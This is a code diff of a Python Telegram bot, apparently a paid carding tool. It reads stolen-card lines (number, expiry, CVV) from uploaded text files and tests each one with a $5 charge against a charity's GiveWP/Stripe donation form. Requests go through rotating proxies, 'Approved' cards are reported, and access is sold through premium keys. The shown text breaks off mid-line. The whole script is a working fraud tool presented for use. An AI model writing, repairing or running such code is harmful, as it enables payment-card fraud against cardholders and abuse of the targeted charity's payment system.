@@ -20,7 +20,6 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
-# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -50,7 +49,6 @@ async def is_premium(user_id):
     except:
         return False
 
-# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
@@ -72,22 +70,16 @@ async def redeem_key(user_id, key: str):
     data[key]["used"] = True
     await save_json(KEYS_FILE, data)
     await save_json(PREMIUM_FILE, premium)
-    return f"✅ Success! Premium activated for {days} days."
+    return f"✅ Premium activated for {days} days."
 
-# ================== REAL CHECKER WITH PROXY ==================
+# ================== REAL CHECK ==================
 async def charge_5_dollars(card: str):
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
         if len(yy) == 2: yy = "20" + yy
 
-        current_time = datetime.now().strftime('%H:%M:%S')
-        print(f"[{current_time}] CHECKING → {cc[:6]}******{cc[-4:]}")
-
-        # Select & Format Proxy
-        proxy_str = random.choice(PROXIES)
-        parts = proxy_str.split(':')
-        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        print(f"[{current_time}] USING PROXY → {parts[0]}:{parts[1]}")
+        proxy = random.choice(PROXIES)
+        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
 
         payload = {
             "amount": "5",
@@ -103,18 +95,13 @@ async def charge_5_dollars(card: str):
                 timeout=35
             ) as r:
                 text = await r.text()
-                print(f"[{current_time}] RESPONSE: {r.status} | {text[:150]}")
-
                 if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
                     return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
                     return {"status": "Declined", "response": "Declined"}
+    except:
+        return {"status": "Declined", "response": "Error"}
 
-    except Exception as e:
-        print(f"[{current_time}] ERROR: {e}")
-        return {"status": "Declined", "response": "Proxy Error"}
-
-# ================== BEAUTIFUL UI ==================
 async def send_approved(event, card, info):
     msg = f"""
 **Approved ✅**
@@ -123,78 +110,27 @@ async def send_approved(event, card, info):
 [ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {info['response']}
 [ϟ] 𝗚𝗮𝘁𝗲 - GiveWP + Stripe
 ━━━━━━━━━━━━━
-[ϟ] 𝗩𝗕𝗩 - Authenticate Frictionless Failed
-━━━━━━━━━━━━━
 [ϟ] B𝗶𝗻 : {card[:6]}
 [ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : United States 🇺🇸
-[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : CITIBANK N.A.
-[ϟ] 𝗧𝘆𝗽𝗲 : VISA | DEBIT - CLASSIC
 ━━━━━━━━━━━━━
 """
     await event.reply(msg)
 
-# ================== BOT ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate.")
-    await event.reply("**🔥 WeAnimals $5 Charge Checker**\nSend `.txt` file")
+        return await event.reply("**❌ No Access**\n\n`/key YOURKEY` bhejo")
+    await event.reply("**🔥 WeAnimals Checker**\n.txt file bhejo")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
-    if event.sender_id != OWNER_ID:
-        return await event.reply("Owner only!")
+    if event.sender_id != OWNER_ID: return await event.reply("Owner only!")
     days = int(event.pattern_match.group(1) or 30)
     key = await generate_key(days)
-    await event.reply(f"✅ New Key:\n`{key}`")
+    await event.reply(f"✅ Key:\n`{key}`")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
 async def redeem(event):
     key = event.pattern_match.group(1)
-    if not key:
-        return await event.reply("Usage: `/key YOURKEY`")
-    msg = await redeem_key(event.sender_id, key)
-    await event.reply(msg)
-
-@client.on(events.NewMessage())
-async def txt_handler(event):
-    if not event.document or not str(event.file.name).lower().endswith('.txt'):
-        return
-    if not await is_premium(event.sender_id):
-        return await event.reply("❌ No Access! Use /key first.")
-
-    await event.reply("📂 Processing TXT file with Proxy...")
-    path = f"temp_{event.sender_id}.txt"
-    await event.download_media(path)
-
-    cards = []
-    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
-        content = await f.read()
-        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
-        for c in found:
-            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
-            if len(cleaned.split('|')) == 4:
-                cards.append(cleaned)
-
-    os.remove(path)
-
-    if not cards:
-        return await event.reply("❌ No valid cards!")
-
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check with Proxy...")
-
-    for card in cards:
-        result = await charge_5_dollars(card)
-        if result["status"] == "Approved":
-            await send_approved(event, card, result)
-        else:
-            await event.reply(f"❌ Declined\n`{card}`")
-        await asyncio.sleep(6)
-
-async def main():
-    print("🚀 Bot Started with Proxy")
-    await client.start(bot_token=BOT_TOKEN)
-    await client.run_until_disconnected()
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    if not key: return await event.reply("Usage: /key KEY")
+    msg = await redeem_key(event.sender_id, key
